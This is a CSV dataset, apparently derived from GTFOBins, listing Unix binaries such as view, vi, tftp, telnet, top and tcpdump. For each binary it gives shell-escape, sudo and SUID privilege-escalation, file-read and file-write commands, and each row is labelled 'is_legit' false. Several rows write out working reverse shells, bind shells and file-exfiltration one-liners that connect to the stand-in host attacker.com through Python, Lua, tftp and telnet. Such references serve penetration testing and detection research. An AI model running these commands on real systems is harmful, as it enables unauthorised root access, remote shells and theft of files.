"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"view","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `view` is compiled with Lua support.'']","[''view -c ':!/bin/sh'''-|-''view :set shell=/bin/sh :shell ''-|-''view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''view -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `view` is compiled with Lua support.'']","[''sudo view -c ':!/bin/sh'''-|-''sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo view -c ':lua os.execute(""reset; exec sh"")''']","","","view file_to_read","","./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","view file_to_write iDATA ^[ w!","","./view -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save view -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save view -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 view -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send view -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 view -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 view -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 view -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.","view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.","./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `view` is compiled with Lua support.","","","","false"
"vi","","","[''vi -c ':!/bin/sh' /dev/null''-|-''vi :set shell=/bin/sh :shell '']","","","sudo vi -c ':!/bin/sh' /dev/null","Modern Unix systems run [`vim`](/gtfobins/vim/) binary when `vi` is called.","","vi file_to_read","","","","vi file_to_write iDATA ^[ w","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"varnishncsa","","","","","","LFILE=file_to_write sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start `varnishncsa` as follows, then trigger the file write with:  ``` curl -H 'yyy: DATA' http://localhost:6081/xxx ```","","","","LFILE=file_to_write ./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"valgrind","","","valgrind /bin/sh","","","sudo valgrind /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"vagrant","","","cd $(mktemp -d) echo 'exec ""/bin/sh""' > Vagrantfile vagrant up","","","cd $(mktemp -d) echo 'exec ""/bin/sh""' > Vagrantfile vagrant up","This allows to execute [`ruby`](/gtfobins/ruby/) code, other functions may apply.","","","","cd $(mktemp -d) echo 'exec ""/bin/sh -p""' > Vagrantfile vagrant up","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"uuencode","","","","","","LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode","","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"uudecode","","","","","","LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode","","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"update-alternatives","","","","","Write in `$LFILE` a symlink to `$TF`.","LFILE=/path/to/file_to_write TF=$(mktemp) echo DATA >$TF sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","","","","","LFILE=/path/to/file_to_write TF=$(mktemp) echo DATA >$TF ./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","","","","","","","","","Write in `$LFILE` a symlink to `$TF`.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unzip","","","","","","sudo unzip -K shell.zip ./sh -p","Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh zip shell.zip sh ```  Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).","","","","./unzip -K shell.zip ./sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unsquashfs","","","","","","sudo unsquashfs shell ./squashfs-root/sh -p","`unsquashfs` preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh mksquashfs sh shell ```  Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).","","","","./unsquashfs shell ./squashfs-root/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unshare","","","unshare /bin/sh","","","sudo unshare /bin/sh","","","","","./unshare -r /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"uniq","","","","","","LFILE=file_to_read sudo uniq ""$LFILE""","The read file content is corrupted by squashing multiple adjacent lines.","","LFILE=file_to_read uniq ""$LFILE""","","LFILE=file_to_read ./uniq ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unexpand","","","","","","LFILE=file_to_read sudo unexpand -t99999999 ""$LFILE""","","","LFILE=file_to_read unexpand -t99999999 ""$LFILE""","","LFILE=file_to_read ./unexpand -t99999999 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ul","","","","","","LFILE=file_to_read sudo ul ""$LFILE""","The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.","","LFILE=file_to_read ul ""$LFILE""","","LFILE=file_to_read ./ul ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tshark","","","TF=$(mktemp) echo 'os.execute(""/bin/sh"")' >$TF tshark -Xlua_script:$TF","","","","This program is able to execute [`lua`](/gtfobins/less/) code.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"troff","","","","","","LFILE=file_to_read sudo troff $LFILE","The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.","","LFILE=file_to_read troff $LFILE","","LFILE=file_to_read ./troff $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"torsocks","","","torsocks /bin/sh","","","sudo torsocks /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"torify","","","torify /bin/sh","","","sudo torify /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"top","","","echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc top # press return twice reset","","This requires that the root configuration file is writable and might be used to persist elevated privileges.","echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc sudo top # press return twice reset","This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tmux","","Provided to have enough permissions to access the socket.","[''tmux''-|-''tmux -S /path/to/socket_name '']","","","sudo tmux","","","LFILE=file_to_read tmux -f $LFILE","","","","","","","","","","The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tmate","","","tmate -c /bin/sh","","","sudo tmate -c /bin/sh","","","","","","","","","./tmate -c /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"timeout","","","timeout 7d /bin/sh","","","sudo timeout --foreground 7d /bin/sh","","","","","./timeout 7d /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"timedatectl","","","timedatectl list-timezones !/bin/sh","","","sudo timedatectl list-timezones !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.  This might not work if run by unprivileged users depending on the system configuration.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"time","","","/usr/bin/time /bin/sh","","","sudo /usr/bin/time /bin/sh","Note that the shell might have its own builtin time implementation, which may behave differently than` /usr/bin/time`, hence the absolute path.","","","","./time /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tic","","","","","","LFILE=file_to_read sudo tic -C ""$LFILE""","The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read tic -C ""$LFILE""","","LFILE=file_to_read ./tic -C ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tftp","","","","","Send local file to a TFTP server.","RHOST=attacker.com sudo tftp $RHOST put file_to_send","","","","","RHOST=attacker.com ./tftp $RHOST put file_to_send","","","","","","Fetch a remote file from a TFTP server.","RHOST=attacker.com tftp $RHOST get file_to_get","","Send local file to a TFTP server.","","","","","","","","Send local file to a TFTP server.","RHOST=attacker.com tftp $RHOST put file_to_send","","","","","","","","","","","","","","","","","","false"
"tex","","","tex --shell-escape '\write18{/bin/sh}\end'","","","sudo tex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","./tex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"terraform","","","","","","sudo terraform console file(""file_to_read"")","","","terraform console file(""file_to_read"")","","./terraform console file(""file_to_read"")","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"telnet","","BSD version only. Needs to be connected first.","RHOST=attacker.com RPORT=12345 telnet $RHOST $RPORT ^] !/bin/sh","","BSD version only. Needs to be connected first.","RHOST=attacker.com RPORT=12345 sudo telnet $RHOST $RPORT ^] !/bin/sh","","","","","","","","","RHOST=attacker.com RPORT=12345 ./telnet $RHOST $RPORT ^] !/bin/sh","","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 TF=$(mktemp -u) mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF","","","","","","","","","","BSD version only. Needs to be connected first.","","","","false"
"tee","","","","","","LFILE=file_to_write echo DATA | sudo tee -a ""$LFILE""","It can only append data if the destination exists.","","","","LFILE=file_to_write echo DATA | ./tee -a ""$LFILE""","","LFILE=file_to_write echo DATA | ./tee -a ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tdbtool","","","tdbtool ! /bin/sh","","","sudo tdbtool ! /bin/sh","","","","","","","","","./tdbtool ! /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tcpdump","","","","","","COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root","These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.  In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.","","","","","","","","","","","","","","","","","","","COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF","","","","","","","","","","","","","","","","","","","","","false"
